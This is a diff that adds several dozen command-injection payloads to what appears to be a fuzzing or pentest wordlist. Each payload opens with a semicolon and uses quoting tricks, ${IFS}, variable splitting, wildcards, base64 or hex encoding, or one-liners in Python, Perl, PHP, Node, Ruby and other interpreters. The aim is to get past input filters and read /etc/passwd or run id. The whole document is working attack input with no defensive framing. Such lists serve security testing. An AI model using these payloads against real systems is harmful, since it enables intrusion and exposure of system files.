@@ -1,4 +1,51 @@
-c${Z}at /etc/passwd
-a=c;b=at;$a$b /etc/passwd
-$(echo 'Y2F0IC9ldGMvcGFzc3dk'|base64 -d|sh)
-$(echo "cat /etc/passwd" | tr -d '\n')
+;c'a't /etc/passwd
+;c"a"t /etc/passwd
+;ca$@t /etc/passwd
+;ca${IFS}t /etc/passwd
+;c\at /etc/passwd
+;\cat /etc/passwd
+;\cat /etc/passwd
+;$(echo Y2F0) /etc/passwd
+;$(echo Y2F0|base64 -d) /etc/passwd
+;$(echo -e "\x63\x61\x74") /etc/passwd
+;$'cat' /etc/passwd
+;$'cat' /etc/passwd
+;X=cat;$X /etc/passwd
+;a=ca;b=t;$a$b /etc/passwd
+;a=c;b=at;$a$b /etc/passwd
+;{cat,/etc/passwd}
+;cat</etc/passwd
+;cat<>/etc/passwd
+;cat /etc/pa????
+;cat /etc/pass*
+;cat /???/passwd
+;cat /etc/[p]asswd
+;/???/cat /etc/passwd
+;/b??/cat /etc/passwd
+;/usr/bin/c?t /etc/passwd
+;$(python3 -c 'import os; os.system(chr(105)+chr(100))')
+;$(perl -e 'system(chr(105).chr(100))')
+;$(php -r 'system(chr(105).chr(100));')
+;$(node -e 'require("child_process").exec(Buffer.from("6964","hex").toString())')
+;$(ruby -e 'exec("i"+"d")')
+;$(awk 'BEGIN{system("id")}')
+;$(lua -e 'os.execute("id")')
+;$(tclsh <<< 'exec id')
+;eval $(echo id|tr 'a-z' 'a-z')
+;eval $(echo "aWQ=" | base64 -d)
+;eval $(printf "id")
+;eval "$(echo id)"
+;`echo id`
+;$(printf "%s" "id")
+;$(printf "id")
+;$(tr -d '' <<< "id")
+;$(rev <<< "di") # id reversed
+;$(awk '{print}' <<< "id")
+;$(sed 's/x//' <<< "xid")
+;$(cut -c1- <<< "id")
+;v=$(echo aWQ=|base64 -d);$v
+;v=id;$v
+;v=i;w=d;$v$w
+;$(ls /bin/ | grep '^id$')
+;$(which id)
+;$(type -a id|head -1|awk '{print $NF}')
